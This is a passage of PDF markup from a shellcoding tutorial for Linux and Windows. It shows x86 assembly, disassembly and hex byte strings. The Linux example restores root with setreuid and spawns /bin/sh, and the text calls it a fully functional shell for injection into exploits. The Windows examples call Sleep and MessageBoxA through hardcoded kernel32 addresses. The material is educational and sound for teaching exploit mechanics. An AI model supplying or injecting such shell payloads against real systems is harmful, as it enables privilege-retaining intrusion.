0 -1.2 TD
(Now that dynamic string addressing has been demonstrated as well as the \ability to )Tj
T*
(zero)Tj
0 -1.2 TD
(out registers, we can move on to a piece of code that gets us a shell.)Tj
/TT1 1 Tf
0 -4.989 TD
(Example 3 - Spawning a Shell)Tj
/TT0 1 Tf
0 -2.525 TD
(    This code combines what we have been doing so far. This code attempt\s to set )Tj
0 -1.2 TD
(root privileges if they are dropped and then spawns a shell. Note: syste\m\("/bin/sh"\) )Tj
T*
(would have been a lot simpler right? Well the only problem with that app\roach is the )Tj
T*
(fact that system always drops privileges.  )Tj
0 -1.1 TD
( )Tj
T*
(Remember when reading this code:  )Tj
/TT2 1 Tf
0 -1.385 TD
(    execve )Tj
/TT3 1 Tf
(\()Tj
/TT2 1 Tf
(const char)Tj
/TT3 1 Tf
( *filename, )Tj
/TT2 1 Tf
(const char)Tj
/TT3 1 Tf
(** argv, )Tj
/TT2 1 Tf
(const char)Tj
/TT3 1 Tf
(** envp\);)Tj
/TT0 1 Tf
( )Tj
0 -0.973 TD
( )Tj
0 -1.1 TD
(So, the second two argument expect pointers to pointers. That's why I lo\ad the )Tj
0 -1.2 TD
(address of the "/bin/sh" into the string memory and then pass the addres\s of the )Tj
T*
(string memory to the function. When the pointers are dereferenced the ta\rget memory )Tj
T*
(will be the "/bin/sh" string. )Tj
ET
0.5 0.5 0.5 rg
8.338 450.148 m
8.338 451.815 l
603.662 451.815 l
602.828 450.982 l
9.172 450.982 l
9.172 450.982 l
h
f
0.875 0.875 0.875 rg
603.662 451.815 m
603.662 450.148 l
8.338 450.148 l
9.172 450.982 l
602.828 450.982 l
602.828 450.982 l
h
f
0 0 0 rg
BT
/TT3 1 Tf
11.673 0 0 11.673 8.3379 418.1396 Tm
(;shellex.asm)Tj
/TT0 1 Tf
0 -1.015 TD
([SECTION .text])Tj
0 -2.4 TD
(global _start)Tj
0 -3.6 TD
(_start:)Tj
0 -1.2 TD
(        xor eax, eax)Tj
T*
(        mov al, 70              ;setreuid is syscall 70)Tj
T*
(        xor ebx, ebx)Tj
T*
(        xor ecx, ecx)Tj
T*
(        int 0x80)Tj
0 -2.4 TD
(        jmp short ender)Tj
T*
(        starter:)Tj
0 -2.4 TD
(        pop ebx                 ;get the address of the string)Tj
0 -1.2 TD
(        xor eax, eax)Tj
0 -2.4 TD
(        mov [ebx+7 ], al        ;put a NULL where the N is in the string\)Tj
0 -1.2 TD
(        mov [ebx+8 ], ebx       ;put the address of the string to where \the)Tj
T*
(                                ;AAAA is)Tj
T*
(        mov [ebx+12], eax       ;put 4 null bytes into where the BBBB is\)Tj
T*
(        mov al, 11              ;execve is syscall 11)Tj
T*
(        lea ecx, [ebx+8]        ;load the address of where the AAAA was)Tj
T*
(        lea edx, [ebx+12]       ;load the address of the NULLS)Tj
T*
(        int 0x80                ;call the kernel, WE HAVE A SHELL!)Tj
ET
EMC 
/Artifact <</Attached [/Bottom ]/Type /Pagination /BBox [18 6.4959 582 14 ]>>BDC 
Q
BT
/T1_0 1 Tf
7.5041 0 0 7.5041 18 8.3052 Tm
(http://vividmachines.com/shellcode/shellcode.html \(7 of 21\)3/27/2007 7\:53:51 AM)Tj
ET
EMC 

endstreamendobj152 0 obj<</Length 4091>>stream
/Artifact <</Attached [/Top ]/Type /Pagination /BBox [18 779.4959 582 787 ]>>BDC 
0 0 0 rg
0 i 
BT
/T1_0 1 Tf
0 Tc 0 Tw 0  Ts 100  Tz 0 Tr 7.5041 0 0 7.5041 18 781.3052 Tm
(Shellcoding for Linux and Windows Tutorial)Tj
ET
EMC 
/Article <</MCID 0 >>BDC 
q
0 18 612 756 re
W* n
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 745.1482 Tm
(        ender:)Tj
0 -1.2 TD
(        call starter)Tj
T*
(        db '/bin/shNAAAABBBB')Tj
ET
0.5 0.5 0.5 rg
8.338 659.938 m
8.338 661.605 l
603.662 661.605 l
602.828 660.772 l
9.172 660.772 l
9.172 660.772 l
h
f
0.875 0.875 0.875 rg
603.662 661.605 m
603.662 659.938 l
8.338 659.938 l
9.172 660.772 l
602.828 660.772 l
602.828 660.772 l
h
f
0 0 0 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 629.7111 Tm
(steve hanna@1337b0x:~$ )Tj
/TT1 1 Tf
(nasm -f elf shellex.asm)Tj
/TT0 1 Tf
0 -1.232 TD
(steve hanna@1337b0x:~$ )Tj
/TT1 1 Tf
(ld -o shellex shellex.o)Tj
/TT0 1 Tf
T*
(steve hanna@1337b0x:~$ )Tj
/TT1 1 Tf
(objdump -d shellex)Tj
/TT0 1 Tf
0 -2.4 TD
(shellex:     file format elf32-i386)Tj
0 -2.4 TD
(Disassembly of section .text:)Tj
0 -2.4 TD
(08048080 <_start>:)Tj
0 -1.232 TD
( 8048080:       )Tj
/TT1 1 Tf
(31 c0)Tj
/TT0 1 Tf
(                   xor    %eax,%eax)Tj
T*
( 8048082:       )Tj
/TT1 1 Tf
(b0 46)Tj
/TT0 1 Tf
(                   mov    $0x46,%al)Tj
T*
( 8048084:       )Tj
/TT1 1 Tf
(31 db)Tj
/TT0 1 Tf
(                   xor    %ebx,%ebx)Tj
T*
( 8048086:       )Tj
/TT1 1 Tf
(31 c9)Tj
/TT0 1 Tf
(                   xor    %ecx,%ecx)Tj
T*
( 8048088:       )Tj
/TT1 1 Tf
(cd 80)Tj
/TT0 1 Tf
(                   int    $0x80)Tj
0 -1.232 TD
( 804808a:       )Tj
/TT1 1 Tf
(eb 16)Tj
/TT0 1 Tf
(                   jmp    80480a2 )Tj
0 -2.4 TD
(0804808c :)Tj
0 -1.232 TD
( 804808c:       )Tj
/TT1 1 Tf
(5b)Tj
/TT0 1 Tf
(                      pop    %ebx)Tj
T*
( 804808d:       )Tj
/TT1 1 Tf
(31 c0)Tj
/TT0 1 Tf
(                   xor    %eax,%eax)Tj
T*
( 804808f:       )Tj
/TT1 1 Tf
(88 43 07)Tj
/TT0 1 Tf
(                mov    %al,0x7\(%ebx\))Tj
T*
( 8048092:       )Tj
/TT1 1 Tf
(89 5b 08)Tj
/TT0 1 Tf
(                mov    %ebx,0x8\(%ebx\))Tj
T*
( 8048095:       )Tj
/TT1 1 Tf
(89 43 0c)Tj
/TT0 1 Tf
(                mov    %eax,0xc\(%ebx\))Tj
T*
( 8048098:       )Tj
/TT1 1 Tf
(b0 0b)Tj
/TT0 1 Tf
(                   mov    $0xb,%al)Tj
T*
( 804809a:       )Tj
/TT1 1 Tf
(8d 4b 08)Tj
/TT0 1 Tf
(                lea    0x8\(%ebx\),%ecx)Tj
T*
( 804809d:       )Tj
/TT1 1 Tf
(8d 53 0c)Tj
/TT0 1 Tf
(                lea    0xc\(%ebx\),%edx)Tj
T*
( 80480a0:       )Tj
/TT1 1 Tf
(cd 80)Tj
/TT0 1 Tf
(                   int    $0x80)Tj
0 -2.4 TD
(080480a2 :)Tj
0 -1.232 TD
( 80480a2:       )Tj
/TT1 1 Tf
(e8 e5 ff ff ff)Tj
/TT0 1 Tf
(          call   804808c )Tj
T*
( 80480a7:       )Tj
/TT1 1 Tf
(2f)Tj
/TT0 1 Tf
(                      das)Tj
T*
( 80480a8:       )Tj
/TT1 1 Tf
(62 69 6e)Tj
/TT0 1 Tf
(                bound  %ebp,0x6e\(%ecx\))Tj
T*
( 80480ab:       )Tj
/TT1 1 Tf
(2f)Tj
/TT0 1 Tf
(                      das)Tj
T*
( 80480ac:       )Tj
/TT1 1 Tf
(73 68)Tj
/TT0 1 Tf
(                   jae    8048116 )Tj
T*
( 80480ae:       )Tj
/TT1 1 Tf
(58)Tj
/TT0 1 Tf
(                      pop    %eax)Tj
T*
( 80480af:       )Tj
/TT1 1 Tf
(41)Tj
/TT0 1 Tf
(                      inc    %ecx)Tj
T*
( 80480b0:       )Tj
/TT1 1 Tf
(41)Tj
/TT0 1 Tf
(                      inc    %ecx)Tj
T*
( 80480b1:       )Tj
/TT1 1 Tf
(41)Tj
/TT0 1 Tf
(                      inc    %ecx)Tj
T*
( 80480b2:       )Tj
/TT1 1 Tf
(41)Tj
/TT0 1 Tf
(                      inc    %ecx)Tj
T*
( 80480b3:       )Tj
/TT1 1 Tf
(42)Tj
/TT0 1 Tf
(                      inc    %edx)Tj
T*
( 80480b4:       )Tj
/TT1 1 Tf
(42)Tj
/TT0 1 Tf
(                      inc    %edx)Tj
T*
( 80480b5:       )Tj
/TT1 1 Tf
(42)Tj
/TT0 1 Tf
(                      inc    %edx)Tj
T*
( 80480b6:       )Tj
/TT1 1 Tf
(42)Tj
/TT0 1 Tf
(                      inc    %edx)Tj
ET
EMC 
/Artifact <</Attached [/Bottom ]/Type /Pagination /BBox [18 6.4959 582 14 ]>>BDC 
Q
BT
/T1_0 1 Tf
7.5041 0 0 7.5041 18 8.3052 Tm
(http://vividmachines.com/shellcode/shellcode.html \(8 of 21\)3/27/2007 7\:53:51 AM)Tj
ET
EMC 

endstreamendobj153 0 obj<</Length 3323>>stream
/Artifact <</Attached [/Top ]/Type /Pagination /BBox [18 779.4959 582 787 ]>>BDC 
0 0 0 rg
0 i 
BT
/T1_0 1 Tf
0 Tc 0 Tw 0  Ts 100  Tz 0 Tr 7.5041 0 0 7.5041 18 781.3052 Tm
(Shellcoding for Linux and Windows Tutorial)Tj
ET
EMC 
/Article <</MCID 0 >>BDC 
q
0 18 612 756 re
W* n
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 759.1558 Tm
(Replace the code at the top with:)Tj
0 -0.5 TD
( )Tj
/TT1 1 Tf
0 -0.732 TD
(char code[] = "\\x31\\xc0\\xb0\\x46\\x31\\xdb\\x31\\xc9\\xcd\\x80\\xeb"\\\)Tj
0 -1.2 TD
(              "\\x16\\x5b\\x31\\xc0\\x88\\x43\\x07\\x89\\x5b\\x08\\x89"\\\)Tj
T*
(              "\\x43\\x0c\\xb0\\x0b\\x8d\\x4b\\x08\\x8d\\x53\\x0c\\xcd"\\\)Tj
T*
(              "\\x80\\xe8\\xe5\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f"\\\)Tj
T*
(              "\\x73\\x68\\x58\\x41\\x41\\x41\\x41\\x42\\x42\\x42\\x42";\)Tj
/TT0 1 Tf
0 -2.525 TD
(This code produces a fully functional shell when injected into an exploi\t)Tj
0 -1.2 TD
(and demonstrates most of the skills needed to write successful shellcode\. Be)Tj
T*
(aware though, the better one is at assembly, the more functional, robust\,)Tj
T*
(and most of all evil, one's code will be.)Tj
/T1_1 1 Tf
0 -2.721 TD
( )Tj
0 -2.557 TD
( )Tj
/TT1 1 Tf
16.1626 0 0 16.1626 8.3379 524.0341 Tm
(Windows Shellcoding)Tj
11.673 0 0 11.673 8.3379 492.0848 Tm
(Example 1 - Sleep is for the Weak!)Tj
/TT0 1 Tf
0 -2.525 TD
(    In order to write successful code, we first need to decide what func\tions we )Tj
0 -1.2 TD
(wish to use for this shellcode and then find their absolute addresses. F\or this )Tj
0 -1.2 TD
(example we just want a thread to sleep for an allotted amount of time. L\et's load up )Tj
T*
(arwin \(found above\) and get started. Remember, the only module guarant\eed to be )Tj
T*
(mapped into the processes address space is kernel32.dll. So for this exa\mple, Sleep )Tj
T*
(seems to be the simplest function, accepting the amount of time the thre\ad should )Tj
0 -1.2 TD
(suspend as its only argument.)Tj
0 -2.589 TD
(G:\\> )Tj
/TT1 1 Tf
(arwin kernel32.dll Sleep)Tj
/TT0 1 Tf
0 -1.2 TD
(arwin - win32 address resolution program - by steve hanna - v.01)Tj
0 -1.232 TD
(Sleep is located at )Tj
/TT1 1 Tf
(0x77e61bea)Tj
/TT0 1 Tf
( in kernel32.dll)Tj
ET
0.5 0.5 0.5 rg
8.338 276.763 m
8.338 278.43 l
603.662 278.43 l
602.828 277.596 l
9.172 277.596 l
9.172 277.596 l
h
f
0.875 0.875 0.875 rg
603.662 278.43 m
603.662 276.763 l
8.338 276.763 l
9.172 277.596 l
602.828 277.596 l
602.828 277.596 l
h
f
0 0 0 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 244.7544 Tm
(;)Tj
/TT2 1 Tf
(sleep.asm)Tj
/TT0 1 Tf
0 -1.2 TD
([SECTION .text])Tj
0 -2.4 TD
(global _start)Tj
0 -3.6 TD
(_start:)Tj
0 -1.2 TD
(        xor eax,eax)Tj
T*
(        mov ebx, 0x77e61bea ;address of Sleep)Tj
T*
(        mov ax, 5000        ;pause for 5000ms)Tj
T*
(        push eax)Tj
T*
(        call ebx        ;Sleep\(ms\);)Tj
ET
0.5 0.5 0.5 rg
8.338 33.475 m
8.338 35.143 l
603.662 35.143 l
602.828 34.309 l
9.172 34.309 l
9.172 34.309 l
h
f
0.875 0.875 0.875 rg
603.662 35.143 m
603.662 33.475 l
8.338 33.475 l
9.172 34.309 l
602.828 34.309 l
602.828 34.309 l
h
f
EMC 
/Artifact <</Attached [/Bottom ]/Type /Pagination /BBox [18 6.4959 582 14 ]>>BDC 
Q
BT
/T1_0 1 Tf
7.5041 0 0 7.5041 18 8.3052 Tm
(http://vividmachines.com/shellcode/shellcode.html \(9 of 21\)3/27/2007 7\:53:51 AM)Tj
ET
EMC 

endstreamendobj154 0 obj<</Length 3592>>stream
/Artifact <</Attached [/Top ]/Type /Pagination /BBox [18 779.4959 582 787 ]>>BDC 
0 0 0 rg
0 i 
BT
/T1_0 1 Tf
0 Tc 0 Tw 0  Ts 100  Tz 0 Tr 7.5041 0 0 7.5041 18 781.3052 Tm
(Shellcoding for Linux and Windows Tutorial)Tj
ET
EMC 
/Article <</MCID 0 >>BDC 
q
0 18 612 756 re
W* n
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 737.5701 Tm
(steve hanna@1337b0x:~$ )Tj
/TT1 1 Tf
(nasm -f elf sleep.asm; ld -o sleep sleep.o; objdump -d sleep)Tj
/TT0 1 Tf
0 -1.2 TD
(sleep:     file format elf32-i386)Tj
0 -2.4 TD
(Disassembly of section .text:)Tj
0 -2.4 TD
(08048080 <_start>:)Tj
0 -1.2 TD
( 8048080:       31 c0                   xor    %eax,%eax)Tj
T*
( 8048082:       bb ea 1b e6 77          mov    $0x77e61bea,%ebx)Tj
0 -1.2 TD
( 8048087:       66 b8 88 13             mov    $0x1388,%ax)Tj
T*
( 804808b:       50                      push   %eax)Tj
T*
( 804808c:       ff d3                   call   *%ebx)Tj
0 -2.4 TD
(Replace the code at the top with:)Tj
/TT1 1 Tf
0 -1.232 TD
(char code[] = "\\x31\\xc0\\xbb\\xea\\x1b\\xe6\\x77\\x66\\xb8\\x88\\x13\\\x50\\xff\\xd3";)Tj
/TT0 1 Tf
0 -2.525 TD
(When this code is inserted it will cause the parent thread to suspend fo\r five )Tj
0 -1.2 TD
(seconds \(note: it will then probably crash because the stack is smashed\ at this )Tj
T*
(point :-D\).)Tj
/T1_0 1 Tf
0 -2.716 TD
( )Tj
/TT1 1 Tf
0 -2.431 TD
(Example 2 - A Message to say "Hey")Tj
/TT0 1 Tf
0 -2.525 TD
(    This second example is useful in the fact that it will show a shellc\oder how to )Tj
0 -1.2 TD
(do several things within the bounds of windows shellcoding. Although thi\s example )Tj
T*
(does nothing more than pop up a message box and say "hey", it demonstrat\es absolute )Tj
T*
(addressing as well as the dynamic addressing using LoadLibrary and GetPr\ocAddress. )Tj
0 -1.2 TD
(The library functions we will be using are LoadLibraryA, GetProcAddress,\ )Tj
T*
(MessageBoxA, and ExitProcess \(note: the A after the function name speci\fies we will )Tj
T*
(be using a normal character set, as opposed to a W which would signify a\ wide )Tj
T*
(character set; such as unicode\). Let's load up arwin and find the addre\sses we need )Tj
T*
(to use. We will not retrieve the address of MessageBoxA at this time, we\ will )Tj
T*
(dynamically load that address.)Tj
0 -2.589 TD
(G:\\>)Tj
/TT1 1 Tf
(arwin kernel32.dll LoadLibraryA)Tj
/TT0 1 Tf
0 -1.2 TD
(arwin - win32 address resolution program - by steve hanna - v.01)Tj
0 -1.232 TD
(LoadLibraryA is located at )Tj
/TT1 1 Tf
(0x77e7d961)Tj
/TT0 1 Tf
( in kernel32.dll)Tj
0 -2.432 TD
(G:\\>)Tj
/TT1 1 Tf
(arwin kernel32.dll GetProcAddress)Tj
/TT0 1 Tf
0 -1.2 TD
(arwin - win32 address resolution program - by steve hanna - v.01)Tj
0 -1.232 TD
(GetProcAddress is located at )Tj
/TT1 1 Tf
(0x77e7b332)Tj
/TT0 1 Tf
( in kernel32.dll)Tj
0 -2.432 TD
(G:\\>)Tj
/TT1 1 Tf
(arwin kernel32.dll ExitProcess)Tj
/TT0 1 Tf
0 -1.2 TD
(arwin - win32 address resolution program - by steve hanna - v.01)Tj
0 -1.232 TD
(ExitProcess is located at )Tj
/TT1 1 Tf
(0x77e798fd)Tj
/TT0 1 Tf
( in kernel32.dll)Tj
ET
0.5 0.5 0.5 rg
8.338 66.629 m
8.338 68.296 l
603.662 68.296 l
602.828 67.462 l
9.172 67.462 l
9.172 67.462 l
h
f
0.875 0.875 0.875 rg
603.662 68.296 m
603.662 66.629 l
8.338 66.629 l
9.172 67.462 l
602.828 67.462 l
602.828 67.462 l
h
f
0 0 0 rg
BT
/TT2 1 Tf
11.673 0 0 11.673 8.3379 34.6203 Tm
(;msgbox.asm )Tj
ET
EMC 
/Artifact <</Attached [/Bottom ]/Type /Pagination /BBox [18 6.4959 582 14 ]>>BDC 
Q
BT
/T1_0 1 Tf
7.5041 0 0 7.5041 18 8.3052 Tm
(http://vividmachines.com/shellcode/shellcode.html \(10 of 21\)3/27/2007 \7:53:51 AM)Tj
ET
EMC 

endstreamendobj155 0 obj<</Length 2593>>stream
/Artifact <</Attached [/Top ]/Type /Pagination /BBox [18 779.4959 582 787 ]>>BDC 
0 0 0 rg
0 i 
BT
/T1_0 1 Tf
0 Tc 0 Tw 0  Ts 100  Tz 0 Tr 7.5041 0 0 7.5041 18 781.3052 Tm
(Shellcoding for Linux and Windows Tutorial)Tj
ET
EMC 
/Article <</MCID 0 >>BDC 
q
0 18 612 756 re
W* n
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 757.0901 Tm
([SECTION .text])Tj
0 -2.4 TD
(global _start)Tj
0 -3.6 TD
(_start:)Tj
0 -1.2 TD
(        ;eax holds return value)Tj
T*
(        ;ebx will hold function addresses)Tj
0 -1.2 TD
(        ;ecx will hold string pointers)Tj
T*
(        ;edx will hold NULL)Tj
0 -2.4 TD
(        )Tj
0 -1.2 TD
(        xor eax,eax)Tj
T*
(        xor ebx,ebx                     ;zero out the registers)Tj
T*
(        xor ecx,ecx)Tj
T*
(        xor edx,edx)Tj
T*
(        )Tj
T*
(        jmp short GetLibrary)Tj
T*
(LibraryReturn:)Tj
T*
(        pop ecx                         ;get the library string)Tj
T*
(        mov [ecx + 10], dl              ;insert NULL)Tj
T*
(        mov ebx, 0x77e7d961             ;LoadLibraryA\(libraryname\);)Tj
T*
(        push ecx                        ;beginning of user32.dll)Tj
T*
(        call ebx                        ;eax will hold the module handle\)Tj
0 -2.4 TD
(        jmp short FunctionName)Tj
0 -1.2 TD
(FunctionReturn:)Tj
0 -2.4 TD
(        pop ecx                         ;get the address of the Function\ string)Tj
0 -1.2 TD
(        xor edx,edx)Tj
T*
(        mov [ecx + 11],dl               ;insert NULL)Tj
T*
(        push ecx)Tj
T*
(        push eax)Tj
T*
(        mov ebx, 0x77e7b332             ;GetProcAddress\(hmodule,functio\nname\);)Tj
T*
(        call ebx                        ;eax now holds the address of Me\ssageBoxA)Tj
T*
(        )Tj
T*
(        jmp short Message)Tj
T*
(MessageReturn:)Tj
T*
(        pop ecx                         ;get the message string)Tj
T*
(        xor edx,edx                     )Tj
T*
(        mov [ecx+3],dl                  ;insert the NULL)Tj
0 -2.4 TD
(        xor edx,edx)Tj
0 -1.2 TD
(        )Tj
T*
(        push edx                        ;MB_OK)Tj
T*
(        push ecx                        ;title)Tj
T*
(        push ecx                        ;message)Tj
T*
(        push edx                        ;NULL window handle)Tj
T*
(        )Tj
T*
(        call eax                        ;MessageBoxA\(windowhandle,msg,t\itle,type\); )Tj
T*
(Address)Tj
ET
EMC 
/Artifact <</Attached [/Bottom ]/Type /Pagination /BBox [18 6.4959 582 14 ]>>BDC 
Q
BT
/T1_0 1 Tf
7.5041 0 0 7.5041 18 8.3052 Tm
(http://vividmachines.com/shellcode/shellcode.html \(11 of 21\)3/27/2007 \7:53:51 AM)Tj
ET
EMC 

endstreamendobj156 0 obj<</Length 966>>stream
/Artifact <</Attached [/Top ]/Type /Pagination /BBox [18 779.4959 582 787 ]>>BDC 
0 0 0 rg
0 i 
BT
/T1_0 1 Tf
0 Tc 0 Tw 0  Ts 100  Tz 0 Tr 7.5041 0 0 7.5041 18 781.3052 Tm
(Shellcoding for Linux and Windows Tutorial)Tj
ET
EMC 
/Article <</MCID 0 >>BDC 
q
0 18 612 756 re
W* n
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 759.1558 Tm
(attempt at breaking the software fails; that is why it is important to u\nderstand )Tj
0 -1.2 TD
(all aspect of the process. Otherwise, good luck and have fun shellcoding\!)Tj
/T1_0 1 Tf
0 -2.716 TD
( )Tj
/TT0 1 Tf
10.7751 0 0 10.7751 221.9542 686.0778 Tm
(Copyright 2004 Steve Hanna)Tj
ET
1 0 0 RG
1 w 10 M 0 j 0 J []0 d 
8.338 655.992 0 0 re
S
BT
/T1_0 1 Tf
11.673 0 0 11.673 8.3379 655.9923 Tm
( )Tj
ET
EMC 
/Artifact <</Attached [/Bottom ]/Type /Pagination /BBox [18 6.4959 582 14 ]>>BDC 
Q
BT
/T1_0 1 Tf
7.5041 0 0 7.5041 18 8.3052 Tm
(http://vividmachines.com/shellcode/shellcode.html \(21 of 21\)3/27/2007 \7:53:51 AM)Tj
ET
EMC 

endstreamendobj157 0 obj<</Length 2937>>stream
/Artifact <</Attached [/Top ]/Type /Pagination /BBox [18 779.4959 582 787 ]>>BDC 
0 0 0 rg
0 i 
BT
/T1_0 1 Tf
0 Tc 0 Tw 0  Ts 100  Tz 0 Tr 7.5041 0 0 7.5041 18 781.3052 Tm
(Shellcoding for Linux and Windows Tutorial)Tj
ET
EMC 
/Article <</MCID 0 >>BDC 
q
0 18 612 756 re
W* n
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 759.1558 Tm
(ender:)Tj
0 -1.2 TD
(        xor edx,edx)Tj
T*
(        push eax                        )Tj
0 -1.2 TD
(        mov eax, 0x77e798fd             ;exitprocess\(exitcode\);)Tj
0 -1.2 TD
(        call eax                        ;exit cleanly so we don't crash \the parent )Tj
T*
(program)Tj
T*
(        )Tj
0 -2.4 TD
(        ;the N at the end of each string signifies the location of the N\ULL)Tj
0 -1.2 TD
(        ;character that needs to be inserted)Tj
T*
(        )Tj
T*
(GetLibrary:)Tj
T*
(        call LibraryReturn)Tj
T*
(        db 'user32.dllN')Tj
0 -1.2 TD
(FunctionName)Tj
0 -1.2 TD
(        call FunctionReturn)Tj
T*
(        db 'MessageBoxAN')Tj
T*
(Message)Tj
T*
(        call MessageReturn)Tj
T*
(        db 'HeyN')Tj
ET
0.5 0.5 0.5 rg
8.338 393.793 m
8.338 395.46 l
603.662 395.46 l
602.828 394.627 l
9.172 394.627 l
9.172 394.627 l
h
f
0.875 0.875 0.875 rg
603.662 395.46 m
603.662 393.793 l
8.338 393.793 l
9.172 394.627 l
602.828 394.627 l
602.828 394.627 l
h
f
0 0 0 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 363.5661 Tm
([steve hanna@1337b0x]$ )Tj
/TT1 1 Tf
(nasm -f elf msgbox.asm; ld -o msgbox msgbox.o; objdump -d )Tj
0 -1.232 TD
(msgbox)Tj
/TT0 1 Tf
0 -2.368 TD
(msgbox:     file format elf32-i386)Tj
0 -2.4 TD
(Disassembly of section .text:)Tj
T*
(08048080 <_start>:)Tj
0 -1.232 TD
( 8048080:       )Tj
/TT1 1 Tf
(31 c0)Tj
/TT0 1 Tf
(                   xor    %eax,%eax)Tj
T*
( 8048082:       )Tj
/TT1 1 Tf
(31 db)Tj
/TT0 1 Tf
(                   xor    %ebx,%ebx)Tj
T*
( 8048084:       )Tj
/TT1 1 Tf
(31 c9)Tj
/TT0 1 Tf
(                   xor    %ecx,%ecx)Tj
T*
( 8048086:       )Tj
/TT1 1 Tf
(31 d2)Tj
/TT0 1 Tf
(                   xor    %edx,%edx)Tj
0 -2.589 TD
( 8048088:       )Tj
/TT1 1 Tf
(eb 37 )Tj
/TT0 1 Tf
(                  jmp    80480c1 )Tj
0 -2.4 TD
(0804808a :)Tj
0 -1.232 TD
( 804808a:       )Tj
/TT1 1 Tf
(59)Tj
/TT0 1 Tf
(                      pop    %ecx)Tj
T*
( 804808b:       )Tj
/TT1 1 Tf
(88 51 0a )Tj
/TT0 1 Tf
(               mov    %dl,0xa\(%ecx\))Tj
T*
( 804808e:       )Tj
/TT1 1 Tf
(bb 61 d9 e7 77)Tj
/TT0 1 Tf
(          mov    $0x77e7d961,%ebx)Tj
T*
( 8048093:       )Tj
/TT1 1 Tf
(51)Tj
/TT0 1 Tf
(                      push   %ecx)Tj
T*
( 8048094:       )Tj
/TT1 1 Tf
(ff d3 )Tj
/TT0 1 Tf
(                  call   *%ebx)Tj
T*
( 8048096:       )Tj
/TT1 1 Tf
(eb 39)Tj
/TT0 1 Tf
(                   jmp    80480d1 )Tj
ET
EMC 
/Artifact <</Attached [/Bottom ]/Type /Pagination /BBox [18 6.4959 582 14 ]>>BDC 
Q
BT
/T1_0 1 Tf
7.5041 0 0 7.5041 18 8.3052 Tm
(http://vividmachines.com/shellcode/shellcode.html \(12 of 21\)3/27/2007 \7:53:51 AM)Tj
ET
EMC 

endstreamendobj158 0 obj<</Length 4503>>stream
/Artifact <</Attached [/Top ]/Type /Pagination /BBox [18 779.4959 582 787 ]>>BDC 
0 0 0 rg
0 i 
BT
/T1_0 1 Tf
0 Tc 0 Tw 0  Ts 100  Tz 0 Tr 7.5041 0 0 7.5041 18 781.3052 Tm
(Shellcoding for Linux and Windows Tutorial)Tj
ET
EMC 
/Article <</MCID 0 >>BDC 
q
0 18 612 756 re
W* n
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 759.1558 Tm
(08048098 :)Tj
0 -1.232 TD
( 8048098:       )Tj
/TT1 1 Tf
(59)Tj
/TT0 1 Tf
(                      pop    %ecx)Tj
T*
( 8048099:       )Tj
/TT1 1 Tf
(31 d2)Tj
/TT0 1 Tf
(                   xor    %edx,%edx)Tj
0 -1.232 TD
( 804809b:       )Tj
/TT1 1 Tf
(88 51 0b)Tj
/TT0 1 Tf
(                mov    %dl,0xb\(%ecx\))Tj
0 -1.232 TD
( 804809e:       )Tj
/TT1 1 Tf
(51)Tj
/TT0 1 Tf
(                      push   %ecx)Tj
T*
( 804809f:       )Tj
/TT1 1 Tf
(50)Tj
/TT0 1 Tf
(                      push   %eax)Tj
T*
( 80480a0:       )Tj
/TT1 1 Tf
(bb 32 b3 e7 77)Tj
/TT0 1 Tf
(          mov    $0x77e7b332,%ebx)Tj
T*
( 80480a5:       )Tj
/TT1 1 Tf
(ff d3 )Tj
/TT0 1 Tf
(                  call   *%ebx)Tj
0 -1.232 TD
( 80480a7:      )Tj
/TT1 1 Tf
( eb 39)Tj
/TT0 1 Tf
(                   jmp    80480e2 )Tj
0 -2.4 TD
(080480a9 :)Tj
0 -1.232 TD
( 80480a9:       )Tj
/TT1 1 Tf
(59)Tj
/TT0 1 Tf
(                      pop    %ecx)Tj
T*
( 80480aa:       )Tj
/TT1 1 Tf
(31 d2)Tj
/TT0 1 Tf
(                   xor    %edx,%edx)Tj
T*
( 80480ac:       )Tj
/TT1 1 Tf
(88 51 03)Tj
/TT0 1 Tf
(                mov    %dl,0x3\(%ecx\))Tj
T*
( 80480af:       )Tj
/TT1 1 Tf
(31 d2)Tj
/TT0 1 Tf
(                   xor    %edx,%edx)Tj
T*
( 80480b1:       )Tj
/TT1 1 Tf
(52)Tj
/TT0 1 Tf
(                      push   %edx)Tj
T*
( 80480b2:       )Tj
/TT1 1 Tf
(51)Tj
/TT0 1 Tf
(                      push   %ecx)Tj
T*
( 80480b3:       )Tj
/TT1 1 Tf
(51)Tj
/TT0 1 Tf
(                      push   %ecx)Tj
T*
( 80480b4:       )Tj
/TT1 1 Tf
(52)Tj
/TT0 1 Tf
(                      push   %edx)Tj
T*
( 80480b5:       )Tj
/TT1 1 Tf
(ff d0)Tj
/TT0 1 Tf
(                   call   *%eax)Tj
0 -2.4 TD
(080480b7 :)Tj
0 -1.232 TD
( 80480b7:       )Tj
/TT1 1 Tf
(31 d2)Tj
/TT0 1 Tf
(                   xor    %edx,%edx)Tj
T*
( 80480b9:       )Tj
/TT1 1 Tf
(50)Tj
/TT0 1 Tf
(                      push   %eax)Tj
T*
( 80480ba:       )Tj
/TT1 1 Tf
(b8 fd 98 e7 77)Tj
/TT0 1 Tf
(          mov    $0x77e798fd,%eax)Tj
T*
( 80480bf:       )Tj
/TT1 1 Tf
(ff d0)Tj
/TT0 1 Tf
(                   call   *%eax)Tj
0 -2.4 TD
(080480c1 :)Tj
0 -1.232 TD
( 80480c1:       )Tj
/TT1 1 Tf
(e8 c4 ff ff ff)Tj
/TT0 1 Tf
(          call   804808a )Tj
T*
( 80480c6:       )Tj
/TT1 1 Tf
(75 73)Tj
/TT0 1 Tf
(                   jne    804813b )Tj
T*
( 80480c8:       )Tj
/TT1 1 Tf
(65)Tj
/TT0 1 Tf
(                      gs)Tj
T*
( 80480c9:       )Tj
/TT1 1 Tf
(72 33)Tj
/TT0 1 Tf
(                   jb     80480fe )Tj
T*
( 80480cb:       )Tj
/TT1 1 Tf
(32 2e)Tj
/TT0 1 Tf
(                   xor    \(%esi\),%ch)Tj
T*
( 80480cd:       )Tj
